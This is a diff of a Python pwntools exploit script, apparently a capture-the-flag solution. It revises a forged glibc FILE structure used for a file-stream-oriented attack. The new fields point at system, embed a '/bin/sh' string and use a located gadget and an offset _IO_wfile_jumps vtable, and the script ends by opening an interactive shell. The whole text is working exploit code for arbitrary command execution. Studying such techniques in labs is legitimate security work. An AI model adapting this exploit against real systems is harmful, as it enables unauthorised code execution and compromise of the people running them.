@@ -62,13 +62,15 @@ while True:
     log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
     fake = FileStructure(0)
-    fake.flags = 0x687320
-    fake._IO_read_ptr = 0x0
-    fake._IO_write_base = 0x0
-    fake._IO_write_ptr = 0x1
-    fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']-0x10
-    fake.unknown2 = p64(0)*4+p64(glibc_base_addr+glibc_e.sym.system)+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x60)
-    fake.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']
+    fake.flags = 0x3b01010101010101
+    fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
+    fake._IO_write_end = u64(b'/bin/sh\x00')
+    fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
+    fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
+    fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
+    fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
+    fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3
+    fake.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
     create_notes(0xf7, bytes(fake))
 
     p.interactive()
